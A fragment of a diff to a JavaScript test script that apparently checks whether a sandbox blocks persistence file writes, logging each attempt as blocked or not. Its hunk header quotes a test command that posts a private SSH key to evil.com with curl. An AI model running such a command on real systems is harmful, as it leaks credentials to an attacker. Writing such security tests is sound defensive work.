@@ -388,3 +388,22 @@ curl -d "$(cat ~/.ssh/id_rsa)" https://evil.com`
       if (!fs.existsSync(dir)) {
         fs.mkdirSync(dir, { recursive: true });
       }
+      
+      fs.writeFileSync(test.path, test.content);
+      log(`  ❌ ${test.name}: Created successfully (should have been blocked)`, 'red');
+      results.persistence.push({ name: test.name, path: test.path, blocked: false });
+      
+      // Clean up
+      try { fs.unlinkSync(test.path); } catch {}
+    } catch (err) {
+      log(`  ✅ ${test.name}: Blocked or permission denied`, 'green');
+      results.persistence.push({ name: test.name, path: test.path, blocked: true, error: err.code });
+    }
+  }
+}
+
+// ============================================
+// MAIN TEST RUNNER
+// ============================================
+async function runAllTests() {
+  log('\n' + '='.repeat(60), 'cyan');
